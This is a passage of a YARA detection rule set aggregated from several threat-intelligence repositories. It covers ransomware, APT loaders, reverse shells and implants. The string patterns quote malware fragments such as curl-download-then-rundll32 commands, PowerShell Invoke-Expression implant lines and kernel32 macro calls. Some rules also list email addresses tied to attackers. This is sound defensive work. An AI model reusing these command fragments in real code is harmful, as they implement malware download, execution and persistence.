	meta:
		description = "Detects email accounts used for exfiltration observed in PowerShellCookieStealer"
		author = "ditekShen"
		id = "c2bbb9a8-3e4c-5676-9676-2708a196ef8d"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L706-L715"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd404e94939acb92dd56a7d2a1f7536bcb3f520ca1e9dc614b53828afbc6dac8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "senmn0w@gmail.com" ascii wide nocase
		$s2 = "mohamed.trabelsi.ena2@gmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rhysida_2
{
	meta:
		description = "Detects files referencing identities associated with Rhysida ransomware"
		author = "ditekShen"
		id = "7ee0fb41-9267-5b65-ada3-229f2e390da6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1688-L1697"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e3e07bab2982a30a5372e6708ede6707d132d410aa5b5b1a29bdb5d06910a88e"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "SethZemlak@onionmail.org" ascii wide nocase
		$s2 = "JacquieKunze@onionmail.org" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Payola_2
{
	meta:
		description = "Detects files referencing identities associated with Payola ransomware"
		author = "ditekShen"
		id = "7c1fc06b-fc71-5679-befd-686b2e05e3a4"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1699-L1708"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "568141c03d14faef0cfc4f5fbdec45a5109a1ad5cbbe99e76a1db86e7ef4dc5d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "pcsupport@skiff.com" ascii wide nocase
		$s2 = "pctalk01@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_OLE_Remotetemplate_2
{
	meta:
		description = "Detects XML relations where an OLE object is refrencing an external target in dropper OOXML documents"
		author = "ditekSHen"
		id = "fbf40436-fc0a-5e55-89ac-5e1dd93e1833"
		date = "2024-09-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L691-L702"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "80cc5b1a8a8899f632401956055374d265c734449e56ffeee5f0ba4911050f36"
		score = 75
		quality = 75
		tags = ""

	strings:
		$olerel = "relationships/oleObject" ascii
		$target1 = "Target=\"http" ascii
		$target2 = "Target=\"file" ascii
		$mode = "TargetMode=\"External" ascii

	condition:
		$olerel and $mode and 1 of ( $target* )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Pe_Inmem_Large_2
{
	meta:
		description = "Matches packed NHAS reverse_ssh PE samples in-memory during execution"
		author = "HarfangLab"
		id = "f6b38e11-c405-5623-bea3-3a8d96b435af"
		date = "2024-09-24"
		modified = "2025-04-16"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/1df815f4210f1d26151026cdd9658dbfc262b019/hl_public_reports_master.yar#L276-L294"
		license_url = "N/A"
		hash = "7798b45ffc488356f7253805dc9c8d2210552bee39db9082f772185430360574"
		logic_hash = "b9bbbbd93dc39f8c16c7f8275fa73f4c345c3ba8f21da76ae491e89d3a22c473"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "\\rprichard\\proj\\winpty\\src\\agent\\" ascii
		$s2 = "\\Users\\mail\\source\\winpty\\src\\" ascii
		$s3 = "Successfully connnected" ascii
		$s4 = "*main.decFunc" ascii fullword
		$s6 = "keepalive-rssh@golang.org" ascii fullword
		$s7 = ".(*sshFxpSetstatPacket)." ascii

	condition:
		( all of them )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Elf_Inmem_Large_2
{
	meta:
		description = "Matches packed NHAS reverse_ssh ELF samples in-memory during execution"
		author = "HarfangLab"
		id = "cd6f7b81-b8df-5e2b-9da6-981d1f62c131"
		date = "2024-09-24"
		modified = "2025-04-16"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/1df815f4210f1d26151026cdd9658dbfc262b019/hl_public_reports_master.yar#L295-L312"
		license_url = "N/A"
		hash = "9f97997581f513166aae47b3664ca23c4f4ea90c24916874ff82891e2cd6e01e"
		logic_hash = "54ba4fc366fb6e4a252d51528ede3ec418b369881ad98e9119d1a9650b6a1bab"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "/NHAS/reverse_ssh/cmd/client" ascii
		$s2 = "/handlers.runCommandWithPty" ascii
		$s3 = "/connection.RegisterChannelCallbacks" ascii
		$s4 = "/internal.RemoteForwardRequest" ascii
		$s7 = "main.Fork" ascii fullword

	condition:
		( all of them )
}

rule SEKOIA_Malware_Win_Lyceum_Maldoc_Macro_20220613_2
{
	meta:
		description = "Detect the macro contained in Lyceum maldoc to deploy its malware"
		author = "Sekoia.io"
		id = "3046bffd-261f-4d5b-9015-f2e5fc31c9c9"
		date = "2022-06-13"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/malware_win_lyceum_maldoc_macro_20220613.yar#L1-L15"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a9f4957e8198b4cb2229913a405b3e0fc97cbd3598bb583dbfdaf56ca278d4cb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "ActiveDocument.InlineShapes(i).PictureFormat.Brightness = 0.5" ascii

	condition:
		all of them
}

rule SEKOIA_Apt_Apt28_Htmlsmuggling_2
{
	meta:
		description = "Detects some kind of HTMLSmuggling used by APT28"
		author = "Sekoia.io"
		id = "2e20c992-d971-4c0f-99b3-a7d528c7055a"
		date = "2023-09-11"
		modified = "2024-12-19"
		reference = "https://www.zscaler.com/blogs/security-research/steal-it-campaign"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt28_htmlsmuggling.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "47cca1d0a0843c8df43661ee8188dae86cce06e1f3982973871863728d328e89"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "click();" ascii
		$s2 = "window.location.replace("

	condition:
		$s1 in ( @s2 .. @s2-100 )
}

rule SEKOIA_Apt_Kimsuky_Sharpext_Compromised_Securepreferences_2
{
	meta:
		description = "Detects compromised Chrome SecurePreferences file"
		author = "Sekoia.io"
		id = "aeda5d15-82e1-4ffc-8252-1eb4fc78d024"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_kimsuky_sharpext_compromised_securepreferences.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "662358fdb4c4cfa9984d06e391ade52e1c7a3d7b78724aea4fb0d6035fe2e7b2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "\"devtools\", \"tabs\", \"webNavigation\", \"webRequest\", \"webRequestBlocking\""
		$ = "AppData\\\\Roaming"
		$ = "https://*/*"

	condition:
		all of them
}

rule SEKOIA_Gen_Empire_Onedrive_Stager_2
{
	meta:
		description = "Detects the Empire OneDrive stager"
		author = "Sekoia.io"
		id = "2053416f-1f53-491e-9c70-787a04362d16"
		date = "2022-01-26"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/gen_empire_onedrive_stager.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "90b3548cd3f4f7f936da70ec95dbe0ff3c1421d40a6e8557952d28d358b7c1f1"
		score = 75
		quality = 76
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$sleep = "Start-Sleep -Seconds $(($PI -as [Int])*2)" wide ascii nocase
		$down = "wc.DownloadData" wide ascii nocase

	condition:
		$down in ( @sleep .. @sleep + 1000 )
}

rule SEKOIA_Downloader_Mac_Rustbucket_Swiftloader_2
{
	meta:
		description = "Detect the file com.EdoneViewer in the new version of RustBucker 2023-10"
		author = "Sekoia.io"
		id = "bdbc95db-5d58-4c96-91f9-34b653e67f50"
		date = "2023-12-05"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_mac_rustbucket_swiftloader.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "acb5b88f8af53cd3d83de0fd6c3049ce017f038dc7c8b31f70e65e60bf713dfb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "7c5bf60787bfd076c8806eaa4f1185f5b9fda69008376624ab3d17f207eb16a4"
		hash2 = "bc90adde92bd47b4de7d384e5b20c1a1791d603629bd0fcba4b550fb35e93216"
		hash3 = "c9a7b42c7b29ca948160f95f017e9e9ae781f3b981ecf6edbac943e52c63ffc8"

	strings:
		$ = "/Users/ghost/Desktop/EdoneViewer/EdoneViewer/"
		$ = "EdoneViewerApp.swift"

	condition:
		1 of them
}

rule SEKOIA_Tool_Enum4Linux_Strings_2
{
	meta:
		description = "Detects enum4linux based on strings"
		author = "Sekoia.io"
		id = "6b3094fe-1292-4da3-a1ed-9e255be531da"
		date = "2024-02-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_enum4linux_strings.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d3f7ddbdfb679b34777298aec84464d55fac7600b855526a7f13d8c8f17ab888"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "my $os_info = `$command`;"
		$ = "($global_workgroup) = $os_info =~"
		$ = "sub enum_groups {"
		$ = "if ($shares =~ /NT_STATUS_ACCESS_DENIED/) {"
		$ = "Can't open share list file $shares_file"
		$ = "my $users = `$command`;"
		$ = "my @shares = <SHARES>;"
		$ = "foreach my $grouptype (\"builtin\", \"domain\") {"

	condition:
		6 of them
}

rule SEKOIA_Apt_Unk_Hrserv_Memory_Commands_Strings_2
{
	meta:
		description = "Detects HrServ web shell memory commands"
		author = "Sekoia.io"
		id = "1b5f442a-e758-4bd5-a612-8b504a542d29"
		date = "2023-11-23"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_unk_hrserv_memory_commands_strings.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a87c35658ded301c098f9ee8ee5886a54e89537eabd145cf82b0286c703a77d2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "list all the process" ascii wide
		$ = "equal with cmd /c tasklist" ascii wide
		$ = "start target service by name" ascii wide
		$ = "query local process information by wmi." ascii wide
		$ = "upload local shellcode to" ascii wide

	condition:
		all of them
}

rule SEKOIA_Water_Sigbin_Group_2
{
	meta:
		description = "Detects IOCs related to the 8220 Mining group."
		author = "Sekoia.io"
		id = "c49728e8-db7e-4d83-97d2-7d56b51f8a52"
		date = "2024-06-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/water_sigbin_group.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "dd51945bf79e37b50d377eda3641eb32438dcb5a1c55fb4a9b66a5b5a8b5ed0d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Z12A3" ascii fullword
		$s2 = "FromBase64String" ascii fullword
		$s3 = "Start-Process" ascii fullword
		$s4 = "WriteAllBytes" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Storm_1811_Files_Dat_2
{
	meta:
		description = "Detects files used in a campaign performed by the intrusion set Storm-1811"
		author = "Sekoia.io"
		id = "8b14f276-0c39-422b-9b19-d96b139a7ae8"
		date = "2024-06-10"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/storm_1811_files_dat.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d1d5b76671cefe8b876ca8df50205a04ebbcd973f115919b901f6a7946492904"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RuntimeBroker" ascii fullword
		$s2 = "InstallSpamFilters" ascii fullword
		$s3 = "newfile333.txt" ascii fullword
		$s4 = "Installing spam filter kb_outlook" ascii fullword
		$s5 = "s.zip" ascii fullword
		$s6 = "Update completed" ascii fullword
		$s7 = "Updates installed" ascii fullword
		$s8 = "update_log.tgz uploaded ok" ascii fullword
		$s9 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii fullword
		$s10 = "runtimebroker_connect" ascii fullword

	condition:
		5 of them
}

rule SEKOIA_Loader_Win_Operationmagalenha_Vbs_2
{
	meta:
		description = "Finds VBS file loading the PeepingTitle backdoor"
		author = "Sekoia.io"
		id = "b1f705d1-de3e-4ce6-9bb7-0e39b6e79add"
		date = "2023-05-31"
		modified = "2024-12-19"
		reference = "https://www.sentinelone.com/labs/operation-magalenha-long-running-campaign-pursues-portuguese-credentials-and-pii/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/loader_win_operationmagalenha_vbs.yar#L1-L39"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "bb1c48ea6a4d9f0bc04df558837f2d448b38eac920cb4030e01b915a4e442708"
		score = 75
		quality = 78
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$str01 = "'Skip to content" ascii
		$str02 = "'Search" ascii
		$str03 = "'Sign in" ascii
		$str04 = "'Sign up" ascii
		$str05 = "'Code" ascii
		$str06 = "'Terms" ascii
		$str07 = "'Privacy" ascii
		$str08 = "'Security" ascii
		$str09 = "'Status" ascii
		$str10 = "'Docs" ascii
		$str11 = "'Contact GitHub" ascii
		$str12 = "'Pricing" ascii
		$str13 = "'API" ascii
		$str14 = "'Training" ascii
		$str15 = "'Blog" ascii
		$str16 = "'About" ascii
		$vbs01 = "WScript.Sleep" ascii nocase
		$vbs02 = "Set obj" ascii nocase
		$vbs03 = "Dim obj" ascii nocase
		$vbs04 = "https://tinyurl.com" ascii nocase
		$vbs05 = "C:\\Users\\Public" ascii nocase
		$vbs06 = "CreateObject(\"WScript.Shell\")" ascii nocase
		$vbs07 = ".SaveToFile" ascii nocase

	condition:
		10 of ( $str* ) and 5 of ( $vbs* )
}

rule SEKOIA_Apt_Apt29_Wineloader_Malicious_Hta_2
{
	meta:
		description = "Detects malicious HTA used by APT29 to drop Wineloader"
		author = "Sekoia.io"
		id = "5a17d854-0564-4830-a0e5-7867b99716c2"
		date = "2024-03-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt29_wineloader_malicious_hta.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "efafcd00b9157b4146506bd381326f39"
		logic_hash = "0cc4692e5ff3f258c287f28030147f725d6a534c4f2f7a2a4ff49a305b7fd13d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID="
		$ = "var _0x"
		$ = "Date['\\x6e\\x6f\\x77']"

	condition:
		all of them
}

rule SEKOIA_Apt_Buhtrap_Maldocx_2
{
	meta:
		description = "Detect the malicious DOCX used by Buhtrap"
		author = "Sekoia.io"
		id = "4aaba2f1-fafd-4e3f-8b18-7beda11464d1"
		date = "2022-02-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_buhtrap_maldocx.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "69968fa6836a71cd835f40c5168d197d3b5fc13b62791279f48a6bdeb4709bd5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<xm:macrosheet xmlns=" ascii fullword
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"WriteFile"
		$ = "CALL(\"kernel32\",\"VirtualAlloc"
		$ = "CALL(\"kernel32\",\"WinExec"
		$ = "CALL(\"kernel32\",\"lstrcatA"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"ExpandEnvironmentStringsA"
		$ = "CALL(\"kernel32\",\"CloseHandle"

	condition:
		all of them
}

rule SEKOIA_Vpn_Mul_Softether_2
{
	meta:
		description = "Detect the open-source SoftEther VPN"
		author = "Sekoia.io"
		id = "a1fbf4fe-b934-4a66-b6b1-ebe2f83505cd"
		date = "2024-04-15"
		modified = "2024-12-19"
		reference = "https://www.softether.org/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/vpn_mul_softether.yar#L1-L29"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "f93e838631518590e518f29557c60a40734da30b62c056f8ebb8febed389551b"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\softether_se%s"
		$ = "GET /vgc_download_dat/ HTTP/1.1"
		$ = "http://x%c.x%c.client.api.vpngate2.jp/api/"
		$ = "http://x0.x0.client.api.vpngate2.jp/check/check.txt"
		$ = "https://x%c.x%c.statistics.api.vpngate2.jp/api/statistics/"
		$ = "Software\\SoftEther Project\\SoftEther VPN\\"
		$ = "|vpnsetup_nosign.exe" wide
		$ = "/ISEASYINSTALLER:%u" wide
		$ = "/CALLERSFXPATH:\"%s\"" wide
		$ = "vpn_client.config" wide
		$ = "vpn_bridge.config" wide
		$ = "|backup_dir_readme.txt" wide
		$ = "vpn_debuginfo_%04u%02u%02u_%02u%02u%02u.zip" wide

	condition:
		8 of them
}

rule SEKOIA_Rat_Win_Reverserat_2
{
	meta:
		description = "Detect SideCopy's ReverseRAT v3 observed in January 2023"
		author = "Sekoia.io"
		id = "8fbd395f-f44e-46d5-a942-7c7e88f37127"
		date = "2023-02-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/rat_win_reverserat.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "b277a824b2671f40298ce03586a2ccc0fca2a081a66230c57a3060c2028f13ee"
		hash = "8b87459483248d7b95424cd52b7d4f3031e89c6644adc2e167556e071d9ec3aa"
		logic_hash = "13a5a916e084996ce4d7840581250f7630652acdcad0f66e21763cb3a9cbccc3"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor" wide
		$ = "select * from Win32_PhysicalMemory" wide
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" wide

	condition:
		all of them
}

rule SEKOIA_Apt_Lazarus_Blindingcan_Rtti_2
{
	meta:
		description = "Detects BLINDINGCAN with RTTI"
		author = "Sekoia.io"
		id = "9a16c189-ffc1-4aa6-8582-298abaecd0ef"
		date = "2022-10-04"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_lazarus_blindingcan_rtti.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "fbec1f9a180782bf330d86facbada9af018741897c58f4ab6e0b52a1b38ae966"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = ".?AVCHTTP_Protocol@@" ascii wide fullword
		$s2 = ".?AVCFileRW@@" ascii wide fullword

	condition:
		all of them
}

rule SEKOIA_Apt_Muddywater_Powershell_Reverse_Secure_Proxy_2
{
	meta:
		description = "Detects PowerShell Reverse Secure Proxy"
		author = "Sekoia.io"
		id = "b255f327-cb56-41b7-82f7-83ee23f791a5"
		date = "2023-11-14"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_muddywater_powershell_reverse_secure_proxy.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "6507bc030d60af5559492bbb02bc619646306ab06c9bd9d3f78ae6ce55307bda"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$CS.Read($buff,4,2) | Out-Null" ascii wide
		$ = "$DP = $buff[2]*256 + $buff[3]" ascii wide
		$ = "$PS3.BeginInvoke() | Out-Null" ascii wide

	condition:
		all of them
}

rule SEKOIA_Apt_Susp_Apt28_Uac0063_Hta_Loader_2
{
	meta:
		description = "Detects some suspected APT28 HTA loader"
		author = "Sekoia.io"
		id = "8e1889c1-c6ac-4048-9d3a-99ccbbd5435f"
		date = "2024-07-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_susp_apt28_uac0063_hta_loader.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "332d9db35daa83c5ad226b9bf50e992713bc6a69c9ecd52a1223b81e992bc725"
		logic_hash = "494331a8088d350e4e49e67fe64041d451886e501775413f908bd9b3faa98aeb"
		score = 65
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HEAD><HTA:APPLICATION ID" ascii fullword
		$ = "id=service>null</span" ascii fullword
		$ = "script Language=\"VBScript.Encode" ascii fullword

	condition:
		2 of them
}

rule SEKOIA_Downloader_Win_Curl_Agent_2
{
	meta:
		description = "Detect the downloader used by Bluenoroff to install it CurlAgent"
		author = "Sekoia.io"
		id = "ddeb2d8f-1b10-4a33-b768-d19412e8551a"
		date = "2023-05-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_win_curl_agent.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b34375ec051c969adec82901c1130b0a389261912559d70c652ee826cb2d4107"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "%s\\marcoor.dll" wide
		$ = "curl -A cur1-agent -L %s -s -d dl"
		$ = "curl -A cur1-agent -L %s -s -d da"
		$ = "cmd /c timeout /t 10 & rundll32 \"%s\" #1" wide
		$ = "cmd /c timeout /t 10 & Del /f /q \"%s\" & attrib -s -h \"%s\" & rundll32 \"%s\" #1" wide

	condition:
		3 of them
}

rule SEKOIA_Apt_Polonium_Powershell_Creepydrive_Strings_2
{
	meta:
		description = "Detects POLONIUM CreepyDrive Powershell implant"
		author = "Sekoia.io"
		id = "0ba196bd-9cd6-4553-b7bf-69989cdb8be4"
		date = "2022-06-03"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_polonium_powershell_creepydrive_strings.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "28b8f10a36d13e97e606b082f20c50c3d48241409e7f1aca621e2af9d756dbe5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "function Exec($comm)" base64 ascii wide
		$ = "$comm = $comm + \"| outstring" base64 ascii wide
		$ = "Invoke-Expression -Command:$comm" base64 ascii wide
		$ = "microsoft.com" base64 ascii wide
		$ = "$req = Invoke-WebRequest" base64 ascii wide
		$ = "$j += $data" base64 ascii wide
		$ = "$res = Exec($arr[$i])" base64 ascii wide
		$ = "$arr = @(iex \"$req\")" base64 ascii wide
		$ = "elseif ($req -cmatch" base64 ascii wide
		$ = "graph.microsoft.com" base64 ascii wide

	condition:
		3 of them
}

rule SEKOIA_Tool_Pivotnacci_2
{
	meta:
		description = "Detects Pivotnacci"
		author = "Sekoia.io"
		id = "31ecb08a-fc92-4cbe-a865-7ce869a5fa6a"
		date = "2024-04-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_pivotnacci.yar#L1-L21"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b0e4bc997775fb5ff258a23e07a58b4897a2ce9d3fffab86e93919857e566d18"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$pivotnacci = "pivotnacci"
		$s1 = "Socks server => %s:%s"
		$s2 = "The default listening address"
		$s3 = "Socks server for HTTP agents"
		$s4 = "Message returned by the agent web page"
		$s5 = "Password to communicate with the agent"
		$s6 = "To specify agent type in case is not automatically detected."

	condition:
		$pivotnacci and 3 of ( $s* )
}

rule SEKOIA_Backdoor_Oyster_2
{
	meta:
		description = "Detects files related to the Oyster backdoor."
		author = "Sekoia.io"
		id = "f95f98ea-1e52-45ae-8abf-a986f95d4ab2"
		date = "2024-08-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/backdoor_oyster.yar#L1-L16"
